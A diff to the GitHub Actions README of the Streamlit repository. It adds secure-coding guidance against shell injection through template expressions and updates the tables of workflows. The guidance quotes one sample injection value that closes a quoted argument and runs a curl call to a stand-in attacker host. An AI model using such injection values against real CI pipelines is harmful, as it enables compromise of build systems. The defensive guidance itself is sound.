@@ -17,6 +17,28 @@ This folder contains all GitHub Actions workflows for the Streamlit repository. 
 
 Avoid adding new external actions unless absolutely necessary. This reduces supply chain risk and makes workflows easier to audit.
 
+### Shell Injection Prevention
+
+**Never interpolate `${{ }}` expressions directly in `run:` blocks when the value could originate from user input.** This includes `inputs.*`, `steps.*.outputs.*`, `github.head_ref`, `github.event.*.body`, `github.event.*.title`, and any value derived from PR/issue content, branch names, or commit messages.
+
+Instead, pass dynamic values through step-level `env:` variables:
+
+```yaml
+# UNSAFE — value is injected directly into the shell command:
+run: |
+  git push origin "${{ steps.create-branch.outputs.branch_name }}"
+
+# SAFE — value is passed as an environment variable:
+env:
+  BRANCH_NAME: ${{ steps.create-branch.outputs.branch_name }}
+run: |
+  git push origin "$BRANCH_NAME"
+```
+
+**Why:** GitHub Actions template expressions (`${{ }}`) are substituted _before_ the shell runs, so a malicious value like `"; curl evil.com; echo "` executes as shell commands. Environment variables are not shell-interpreted during substitution, so they are safe.
+
+**Safe contexts that don't need `env:` indirection:** `${{ }}` in `with:` parameters (parsed by YAML, not shell), `if:` conditions, and `env:` value positions are not vulnerable. GitHub-controlled constants like `github.repository`, `github.run_id`, and `github.sha` are also safe in `run:` blocks since their format is constrained.
+
 ### Best Practices
 
 - Use `workflow_call` to create reusable workflows
@@ -56,14 +78,14 @@ steps:
 | Workflow | Trigger | Description |
 |----------|---------|-------------|
 | `python-tests.yml` | Push/PR to `develop` | Python unit tests, linting, type checking across all supported Python versions |
-| `js-tests.yml` | Push/PR to `develop` | Frontend TypeScript linting, type checking, and Vitest unit tests with coverage |
+| `js-tests.yml` | Push/PR to `develop` | Frontend TypeScript linting, type checking, Knip dependency analysis (PR-blocking), and Vitest unit tests with coverage |
 | `js-unit-tests.yml` | `workflow_call` | Reusable JS unit test workflow (called by other workflows) |
 | `playwright.yml` | Push/PR to `develop` | Full E2E test suite across webkit, chromium, and firefox |
 | `playwright-changed-files.yml` | PR | Runs E2E tests only for changed test files (faster feedback) |
 | `playwright-custom-components.yml` | Push/PR to `develop` | E2E tests specifically for custom components |
-| `playwright-starlette.yml` | Push to `develop`, labeled PR | E2E tests using experimental Starlette server backend |
 | `cli-regression.yml` | Push/PR to `develop` | CLI regression tests (builds package and runs CLI tests) |
-| `performance.yml` | Push/PR to `develop` | Performance benchmarks (Playwright, Python, Lighthouse) |
+| `performance.yml` | Push to `develop`, `run-performance` label on PR | Performance benchmarks (Playwright, Python, Lighthouse) |
+| `load-testing.yml` | `run-load-testing` label or manual | Server load testing with concurrent Playwright sessions |
 | `component-template-e2e-tests.yml` | Push/PR to `develop` | Tests for the streamlit/component-template repo |
 | `python-bare-executions.yml` | Push/PR to `develop` | Bare Python execution tests |
 | `flaky-test-verification.yml` | `flaky-verify` label | Runs E2E tests multiple times to verify flakiness fixes |
@@ -75,7 +97,7 @@ steps:
 |----------|---------|-------------|
 | `enforce-pre-commit.yml` | Push/PR to `develop` | Runs all pre-commit hooks on the codebase |
 | `ensure-relative-imports.yml` | Push/PR to `develop` | Validates relative imports in `@streamlit/lib` build output |
-| `require-labels.yml` | PR events | Enforces required PR labels (change type, impact, security) |
+| `require-labels.yml` | PR events | Enforces required PR labels (change type, impact) |
 | `snapshot-hygiene.yml` | Push/PR (e2e_playwright changes) | Detects orphaned E2E test snapshots |
 | `spec-validation.yml` | PR with `change:spec` label | Validates product spec PRs in `specs/` directory |
 
@@ -104,9 +126,10 @@ steps:
 | Workflow | Trigger | Description |
 |----------|---------|-------------|
 | `pr-preview.yml` | Push/PR to `develop` | Builds wheel, uploads to S3, creates preview deployment |
-| `autofix.yml` | `autofix` label on PR | Runs formatters/linters and creates fix PR |
+| `autofix.yml` | `autofix` label on PR | Runs formatters, linters, and other cleanups, then creates fix PR |
 | `snapshot-autofix.yml` | `update-snapshots` label | Downloads failed snapshots and creates update PR |
 | `fork-pr-welcome.yml` | PR opened from fork | Posts welcome comment with contribution guidelines |
+| `stale-prs.yml` | Daily schedule (6:30 UTC), Manual (`workflow_dispatch`) | Stale PR processing for inactivity policy |
 
 ### AI-Assisted Workflows
 
@@ -114,6 +137,9 @@ steps:
 |----------|---------|-------------|
 | `ai-pr-review.yml` | `ai-review` label or manual | AI-powered code review using Cursor CLI |
 | `ai-issue-triage.yml` | `ai-review` label on issue or manual | AI-powered issue triage (duplicates, labels) |
+| `ai-update-docs.yml` | Weekly (Tuesdays) or manual | AI-powered documentation review and updates |
+| `ai-fix-flaky-e2e-tests.yml` | Weekly (Fridays) or manual | AI-powered flaky E2E test diagnosis and fixing |
+| `ai-test-coverage.yml` | Weekly (Wednesdays) or manual | AI-powered test coverage improvement for frontend and Python |
 
 ### Maintenance & Updates
 
